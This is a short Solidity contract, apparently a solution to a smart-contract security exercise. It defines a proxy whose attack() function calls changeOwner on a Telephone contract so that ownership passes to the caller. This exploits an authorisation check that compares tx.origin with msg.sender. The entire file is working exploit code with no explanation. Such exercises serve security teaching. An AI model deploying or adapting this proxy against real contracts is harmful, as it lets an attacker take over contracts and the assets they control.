pragma solidity ^0.6.0;
import "./Telephone.sol";

contract TelephoneProxy {
    Telephone telephone;

    constructor(address _telephoneAddress) public {
        telephone = Telephone(_telephoneAddress);
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}
